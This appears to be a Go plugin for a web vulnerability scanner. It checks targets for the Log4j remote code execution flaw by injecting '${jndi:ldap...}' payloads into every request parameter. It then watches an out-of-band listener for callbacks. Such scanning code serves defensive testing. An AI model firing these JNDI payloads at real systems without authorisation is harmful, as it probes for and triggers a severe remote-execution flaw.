/**
2 * @Author: shaochuyu
3 * @Date: 7/6/24
4 */

package gopoc

import (
	"context"
	"fmt"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/reverse"
	logger "wscan/core/utils/log"
)

type log4jRce struct {
}

func (*log4jRce) Finger() *base.Finger {
	return &base.Finger{
		ExecAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Infof("开始检测[%s] URL=%s", "poc-go-log4j-rce", flow.Request.URL().String())
			for _, param := range flow.Request.ParamsQueryAndBody() {
				unit := ab.Reverse.Register(nil)
				payload := fmt.Sprintf("${jndi:%s}", unit.GetLdapURL())
				parameter := http.Parameter{Position: param.Position, Key: param.Key, Value: payload}
				req := flow.Request.Mutate(&parameter)
				res, err := ab.HTTPClient.Respond(context.TODO(), req)
				if err != nil {
					continue
				}
				unit.OnVisit(func(event *reverse.Event) error {
					v := ab.NewWebVuln(req, res, &parameter)
					if v != nil {
						v.SetTargetURL(flow.Request.URL())
						v.Payload = payload
						ab.OutputVuln(v)
					}
					return nil
				})
				unit.Fetch(0)
			}
			return nil
		},
		Channel:     "web-generic",
		NeedReverse: true,
		CheckAction: func(ctx context.Context, apollo *base.Apollo) error {
			return nil
		},
		Binding: &model.VulnBinding{ID: "poc-go-log4j-rce", Plugin: "poc-go-log4j-rce", Category: "poc"},
	}
}
